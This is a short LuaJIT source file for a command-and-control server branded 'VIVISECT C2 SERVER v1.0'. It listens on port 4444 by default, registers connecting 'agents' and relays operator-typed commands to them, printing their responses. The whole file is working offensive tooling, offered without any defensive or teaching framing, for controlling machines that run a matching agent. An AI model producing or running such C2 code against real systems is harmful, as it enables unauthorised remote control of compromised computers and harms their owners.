#!/usr/bin/env luajit
-- network/c2_server.lua - Command & Control server

local socket = require("socket")

local agents = {}

local function handle_agent(client, addr)
    print(string.format("[+] Agent connected from %s", addr))
    
    table.insert(agents, {
        socket = client,
        address = addr,
        connected_at = os.time()
    })
    
    while true do
        io.write("[C2] > ")
        local cmd = io.read()
        
        if cmd == "exit" then break end
        if cmd == "agents" then
            for i, agent in ipairs(agents) do
                print(string.format("  [%d] %s (connected %ds ago)", 
                    i, agent.address, os.time() - agent.connected_at))
            end
        else
            client:send(cmd .. "\n")
            local response = client:receive("*l")
            if response then
                print("[Agent] " .. response)
            else
                print("[-] Agent disconnected")
                break
            end
        end
    end
end

local function start_c2(port)
    local server = assert(socket.bind("*", port))
    
    print(string.format([[
╔══════════════════════════════════════════╗
║     VIVISECT C2 SERVER v1.0             ║
║     Listening on port %d              ║
╚══════════════════════════════════════════╝
]], port))
    
    print("[*] Waiting for agents...")
    
    while true do
        local client, err = server:accept()
        if client then
            local addr = client:getpeername()
            handle_agent(client, addr or "unknown")
        end
    end
end

local port = tonumber(arg[1]) or 4444
start_c2(port)
